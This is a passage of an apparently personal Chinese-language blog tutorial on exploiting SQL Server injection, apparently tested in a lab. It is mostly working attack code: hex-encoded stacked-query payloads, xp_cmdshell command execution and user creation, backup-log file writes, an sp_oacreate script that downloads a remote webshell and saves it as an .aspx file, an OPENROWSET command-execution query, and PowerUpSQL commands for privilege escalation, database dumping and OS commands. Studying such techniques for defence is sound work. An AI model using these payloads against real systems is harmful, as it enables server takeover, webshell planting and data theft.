+<h3 id="从写文件到getshell"><a href="#从写文件到getshell" class="headerlink" title="从写文件到getshell"></a>从写文件到getshell</h3><h4 id="转存入表"><a href="#转存入表" class="headerlink" title="转存入表"></a>转存入表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> mydata (line <span class="built_in">varchar</span>(<span class="number">8000</span>));</span><br><span class="line">bulk <span class="keyword">insert</span> mydata <span class="keyword">from</span> <span class="string">'c:/tmp/1.txt'</span>;   <span class="comment">#使用之前xp_cmdshell写入的1.txt文件写入表</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mydata;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> mydata;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/c0cho/hexo/source/_posts/MsSQL%E6%B3%A8%E5%85%A5/mssql-16.png" alt="mssql-16"></p>
+<h4 id="16进制转换绕过"><a href="#16进制转换绕过" class="headerlink" title="16进制转换绕过"></a>16进制转换绕过</h4><p>首先创建数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> @xy <span class="built_in">varchar</span>(<span class="number">8000</span>) <span class="keyword">set</span> @xy=<span class="string">';'</span></span><br><span class="line"><span class="keyword">select</span> @xy=@xy + <span class="string">''</span> +<span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span> <span class="keyword">and</span> <span class="keyword">name</span> &gt; @xy</span><br><span class="line"><span class="keyword">select</span> @xy <span class="keyword">as</span> xy <span class="keyword">into</span> TMP_DB</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>创建成功，可查询</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-17.png" alt="mssql-17"></p>
+<p>如下数据转换为16进制，注意空格数据，有时候需要自己加空格的16进制内容</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-18.png" alt="mssql-18"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and 1=0; <span class="keyword">declare</span> @S <span class="built_in">varchar</span>(<span class="number">4000</span>) <span class="keyword">set</span> @S=<span class="keyword">CAST</span>(<span class="number">0x44524f50205441424c4520544d505f44423b</span> <span class="keyword">AS</span> <span class="built_in">VARCHAR</span>(<span class="number">4000</span>)); exec (@S);</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-19.png" alt="mssql-19"></p>
+<p>####绕过引号</p>
+<p>select * from users where username=char(97)+char(100)+char(109)+char(105)+char(110)</p>
+<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><h5 id="xp-cmdshell-执行系统命名写入文件"><a href="#xp-cmdshell-执行系统命名写入文件" class="headerlink" title="xp_cmdshell 执行系统命名写入文件"></a>xp_cmdshell 执行系统命名写入文件</h5><p><code>whoami</code>查看MSSQL权限，若MSSQL以WIndows身份验证的方式运行，则获取的权限为启动身份。若为sa账号，则使用的是<code>nt service\mssqlserver</code>服务权限，但这并不是系统的一个用户，而只是一个服务。它们在Windows中有安全标识符（SID），但并不是真正的用户</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-24.png" alt="mssql-24"></p>
+<p>服务权限下无法添加用户</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-25.png" alt="mssql-25"></p>
+<p>使MSSQL以WIndows身份验证的方式运行，找到MSSQL服务</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-26.png" alt="mssql-26"></p>
+<p>勾选如下选项</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-27.png" alt="mssql-27"></p>
+<p>以管理员身份重启后如下</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-28.png" alt="mssql-28"></p>
+<p>可执行用户添加命令</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-29.png" alt="mssql-29"></p>
+<h3 id="dbowner权限下进行扩展攻击利用"><a href="#dbowner权限下进行扩展攻击利用" class="headerlink" title="dbowner权限下进行扩展攻击利用"></a>dbowner权限下进行扩展攻击利用</h3><p>先做一次数据库备份，如下</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-21.png" alt="mssql-21"></p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-22.png" alt="mssql-22"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">alter</span> <span class="keyword">database</span> news <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span> <span class="comment">--</span></span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span>(<span class="keyword">str</span> image)<span class="comment">--</span></span><br><span class="line">;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">test</span>(<span class="keyword">str</span>)<span class="keyword">values</span>(<span class="string">'恶意代码'</span>)<span class="comment">--</span></span><br><span class="line">;<span class="keyword">backup</span> <span class="keyword">log</span> news <span class="keyword">to</span> disk =<span class="string">'c:\tmp\test.txt'</span> <span class="keyword">with</span> init<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>上述代码执行后查看test.txt文件如下，实际场景利用为写入恶意文件</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-23.png" alt="mssql-23"></p>
+<h3 id="sp-oacreate下权利用限"><a href="#sp-oacreate下权利用限" class="headerlink" title="sp_oacreate下权利用限"></a>sp_oacreate下权利用限</h3><p>启用sp_oacreate组件</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure 'show advanced options',1;</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO=</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-30.png" alt="mssql-30"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure <span class="string">'Ole Automation Procedures'</span>,<span class="number">1</span><span class="comment">;</span></span><br><span class="line">GO</span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-31.png" alt="mssql-31"></p>
+<p>执行如下代码写入webshell</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;DECLARE <span class="meta">@B</span> varbinary(<span class="number">8000</span>),<span class="meta">@hr</span> <span class="built_in">int</span>,<span class="meta">@http</span> INT,<span class="meta">@down</span> INT </span><br><span class="line">exec sp_oacreate[Microsoft.XMLHTTP],<span class="meta">@http</span> output </span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@http</span>,[Open],<span class="keyword">null</span>,[GET],[http:<span class="comment">//192.168.64.2/muma.txt],0   #远程webshell</span></span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@http</span>,[Send],<span class="keyword">null</span> EXEC <span class="meta">@hr</span>=sp_OAGetProperty <span class="meta">@http</span>,[responseBody],<span class="meta">@B</span> output EXEC <span class="meta">@hr</span>=sp_oacreate [ADODB.Stream],<span class="meta">@down</span> output </span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_OASetProperty <span class="meta">@down</span>,[<span class="built_in">Type</span>],<span class="number">1</span></span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_OASetProperty <span class="meta">@down</span>,[mode],<span class="number">3</span> EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@down</span>,[Open],<span class="keyword">null</span> </span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@down</span>,[Write],<span class="keyword">null</span>,<span class="meta">@B</span> EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@down</span>,[SaveToFile],<span class="keyword">null</span>,[C:\mssqli-test\muma.aspx],<span class="number">1</span>   #写入位置</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-32.png" alt="mssql-32"></p>
+<p>webshell写入成功</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-33.png" alt="mssql-33"></p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-34.png" alt="mssql-34"></p>
+<p>蚁剑连接成功，需要注意此处使用<code>http://172.16.237.156/muma.apsx</code>未成功，查看链接地址为``<a href="http://172.16.237.156/muma`可以访问，同时链接成功，实际为省略aspx后缀" target="_blank" rel="noopener">http://172.16.237.156/muma`可以访问，同时链接成功，实际为省略aspx后缀</a></p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-35.png" alt="mssql-35"></p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-36.png" alt="mssql-36"></p>
+<h3 id="OPENROWEST绕过Web限制"><a href="#OPENROWEST绕过Web限制" class="headerlink" title="OPENROWEST绕过Web限制"></a>OPENROWEST绕过Web限制</h3><p>无法直接连接远程数据库，并无法使用多语句注入时，就需要再Web端，执行xp_cmdshell之类命令。但由于语法限制，DML语句中无法直接调用DCL语句。因此，这时就需要使用OPENROWEST来绕过限制。</p>
+<p>OPENROWEST包含访问OLE DB数据源中的远程数据所需所有连接信息，并可以在查询的from子句中引用，就好像它是一个表名。</p>
+<p>环境比较难搭建，暂时附上参考链接，后续有需要再搭建环境测试</p>
+<p><a href="https://www.moonsec.com/archives/125" target="_blank" rel="noopener">https://www.moonsec.com/archives/125</a></p>
+<p>也可以使用如下代码执行xp_cmdshell</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset ('sqloledb','数据库地址';'数据库用户名';'数据库密码','set fmtonly off<span class="built_in"> execute </span>master..xp_cmdshell <span class="string">"dir"</span>');</span><br></pre></td></tr></table></figure>
+
+<p>###其他存储过程使用</p>
+<h4 id="system权限"><a href="#system权限" class="headerlink" title="system权限"></a>system权限</h4><p>xp_regwite 操作注册表</p>
+<p>sp_makewebtask 写入一句话木马</p>
+<p>sp_oacreate  存储远程下载文件</p>
+<p>sp_addlogin 扩展管理数据库用户</p>
+<h3 id="MSSQL注入参考"><a href="#MSSQL注入参考" class="headerlink" title="MSSQL注入参考"></a>MSSQL注入参考</h3><p><a href="http://blog.sina.com.cn/s/blog_c71409200101fb3u.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_c71409200101fb3u.html</a></p>
+<p><a href="https://www.cnblogs.com/vigarbuaa/p/3371500.html" target="_blank" rel="noopener">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_34319999/article/details/92479895" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34319999/article/details/92479895</a></p>
+<p><a href="https://www.anquanke.com/post/id/156911?from=groupmessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156911?from=groupmessage</a></p>
+<h3 id="PowerUpSQL使用"><a href="#PowerUpSQL使用" class="headerlink" title="PowerUpSQL使用"></a>PowerUpSQL使用</h3><h4 id="设置允许外部脚本"><a href="#设置允许外部脚本" class="headerlink" title="设置允许外部脚本"></a>设置允许外部脚本</h4><p>set-executionpolicy remotesigned</p>
+<h4 id="安装方式一-安装模块"><a href="#安装方式一-安装模块" class="headerlink" title="安装方式一 安装模块"></a>安装方式一 安装模块</h4><p>install-module -name powerupsql</p>
+<h4 id="安装方式二-下载github项目文件-移动到相关路径-执行以下命令"><a href="#安装方式二-下载github项目文件-移动到相关路径-执行以下命令" class="headerlink" title="安装方式二 下载github项目文件 移动到相关路径 执行以下命令"></a>安装方式二 下载github项目文件 移动到相关路径 执行以下命令</h4><p>import-module powerupsql.psd1</p>
+<h4 id="安装方式三-导入函数"><a href="#安装方式三-导入函数" class="headerlink" title="安装方式三 导入函数"></a>安装方式三 导入函数</h4><p>IEX(New-Object System.Net.WebClient).DownloadString(“<a href="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&quot;" target="_blank" rel="noopener">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&quot;</a>)</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-37.png" alt="mssql-37"></p>
+<h4 id="安装方式四-CS加载"><a href="#安装方式四-CS加载" class="headerlink" title="安装方式四 CS加载"></a>安装方式四 CS加载</h4><p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-38.png" alt="mssql-38"></p>
+<h4 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-SQLInstanceLocal -<span class="keyword">Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-39.png" alt="mssql-39"></p>
+<h4 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$Targets = Get-SQLInstanceDomain -<span class="keyword">Verbose</span> | <span class="type">Get</span>-SQLConnectionTestThreaded -<span class="keyword">Verbose</span> -Threads <span class="number">10</span> -username sa -password <span class="number">123.</span>com | <span class="type">Where</span>-Object &#123;$<span class="keyword">_</span>.Status -like <span class="string">"Accessible"</span>&#125;</span><br><span class="line"></span><br><span class="line">$Targets</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-40.png" alt="mssql-40"></p>
+<h4 id="升级为sa权限"><a href="#升级为sa权限" class="headerlink" title="升级为sa权限"></a>升级为sa权限</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SQLEscalatePriv -<span class="keyword">Verbose</span> -<span class="keyword">Instance</span> XUANJIANWEAPO</span><br></pre></td></tr></table></figure>
+
+<h4 id="把整个数据库扒下来后审计"><a href="#把整个数据库扒下来后审计" class="headerlink" title="把整个数据库扒下来后审计"></a>把整个数据库扒下来后审计</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SQLDumpInfo -<span class="keyword">Verbose</span> -<span class="keyword">Instance</span> XUANJIANWEAPO</span><br></pre></td></tr></table></figure>
+
+<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Targets | <span class="type">Invoke</span>-SQLOSCmd -<span class="keyword">Verbose</span> -Command <span class="string">"Whoami"</span> -Threads <span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-41.png" alt="mssql-41"></p>
+<h4 id="其他使用方式"><a href="#其他使用方式" class="headerlink" title="其他使用方式"></a>其他使用方式</h4><p>登录session：<code>$Target</code></p>
+<p>提权命令：<code>Invoke-SQLmpersonateServ</code>、<code>Invoke-SQLAudit</code>、<code>Invoke-SQLEscalatePriv</code></p>
+<p>执行系统命令：<code>Invoke-SQLOSCmd、</code>Invoke-SQLOSPython`</p>
+<p>内网探测：<code>Get-SQLInstanceBroadcast</code>、<code>Get-SQLInstanceScanUDPThreaded</code>、Get-SQLInstanceFile</p>
+<h4 id="PowerUpSQL使用参考"><a href="#PowerUpSQL使用参考" class="headerlink" title="PowerUpSQL使用参考"></a>PowerUpSQL使用参考</h4><p><a href="https://github.com/NetSPI/PowerUpSQL/" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/</a></p>
+<p><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</a></p>
+<p><a href="https://www.freebuf.com/column/172122.html" target="_blank" rel="noopener">https://www.freebuf.com/column/172122.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2020/03/19/MsSQL注入/" title="MsSQL注入">https://choge.top/2020/03/19/MsSQL注入/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/mssql/" rel="tag"># mssql</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/03/04/无风险套利-序/" rel="next" title="无风险套利-序">
+                  <i class="fa fa-chevron-left"></i> 无风险套利-序
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/03/22/记一次docker安装oracle-11g/" rel="prev" title="记一次docker安装oracle_11g">
+                  记一次docker安装oracle_11g <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL安装"><span class="nav-number">1.</span> <span class="nav-text">MSSQL安装</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL安装-1"><span class="nav-number">1.1.</span> <span class="nav-text">MSSQL安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL身份验证方式"><span class="nav-number">1.2.</span> <span class="nav-text">MSSQL身份验证方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL自带数据库"><span class="nav-number">1.3.</span> <span class="nav-text">MSSQL自带数据库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL注入"><span class="nav-number">2.</span> <span class="nav-text">MSSQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息探测"><span class="nav-number">2.1.</span> <span class="nav-text">信息探测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#初步判断是否为mssql"><span class="nav-number">2.1.1.</span> <span class="nav-text">初步判断是否为mssql</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断数据库"><span class="nav-number">2.1.2.</span> <span class="nav-text">判断数据库</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暴数据表"><span class="nav-number">2.2.</span> <span class="nav-text">暴数据表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆数据"><span class="nav-number">2.3.</span> <span class="nav-text">爆数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获取用户账号和hash"><span class="nav-number">2.3.1.</span> <span class="nav-text">获取用户账号和hash</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限探测"><span class="nav-number">2.4.</span> <span class="nav-text">权限探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#从写文件到getshell"><span class="nav-number">2.5.</span> <span class="nav-text">从写文件到getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#转存入表"><span class="nav-number">2.5.1.</span> <span class="nav-text">转存入表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#16进制转换绕过"><span class="nav-number">2.5.2.</span> <span class="nav-text">16进制转换绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件操作"><span class="nav-number">2.5.3.</span> <span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#xp-cmdshell-执行系统命名写入文件"><span class="nav-number">2.5.3.1.</span> <span class="nav-text">xp_cmdshell 执行系统命名写入文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dbowner权限下进行扩展攻击利用"><span class="nav-number">2.6.</span> <span class="nav-text">dbowner权限下进行扩展攻击利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sp-oacreate下权利用限"><span class="nav-number">2.7.</span> <span class="nav-text">sp_oacreate下权利用限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OPENROWEST绕过Web限制"><span class="nav-number">2.8.</span> <span class="nav-text">OPENROWEST绕过Web限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system权限"><span class="nav-number">2.8.1.</span> <span class="nav-text">system权限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL注入参考"><span class="nav-number">2.9.</span> <span class="nav-text">MSSQL注入参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerUpSQL使用"><span class="nav-number">2.10.</span> <span class="nav-text">PowerUpSQL使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#设置允许外部脚本"><span class="nav-number">2.10.1.</span> <span class="nav-text">设置允许外部脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安装方式一-安装模块"><span class="nav-number">2.10.2.</span> <span class="nav-text">安装方式一 安装模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安装方式二-下载github项目文件-移动到相关路径-执行以下命令"><span class="nav-number">2.10.3.</span> <span class="nav-text">安装方式二 下载github项目文件 移动到相关路径 执行以下命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安装方式三-导入函数"><span class="nav-number">2.10.4.</span> <span class="nav-text">安装方式三 导入函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安装方式四-CS加载"><span class="nav-number">2.10.5.</span> <span class="nav-text">安装方式四 CS加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看信息"><span class="nav-number">2.10.6.</span> <span class="nav-text">查看信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#连接数据库"><span class="nav-number">2.10.7.</span> <span class="nav-text">连接数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#升级为sa权限"><span class="nav-number">2.10.8.</span> <span class="nav-text">升级为sa权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#把整个数据库扒下来后审计"><span class="nav-number">2.10.9.</span> <span class="nav-text">把整个数据库扒下来后审计</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#执行系统命令"><span class="nav-number">2.10.10.</span> <span class="nav-text">执行系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他使用方式"><span class="nav-number">2.10.11.</span> <span class="nav-text">其他使用方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PowerUpSQL使用参考"><span class="nav-number">2.10.12.</span> <span class="nav-text">PowerUpSQL使用参考</span></a></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
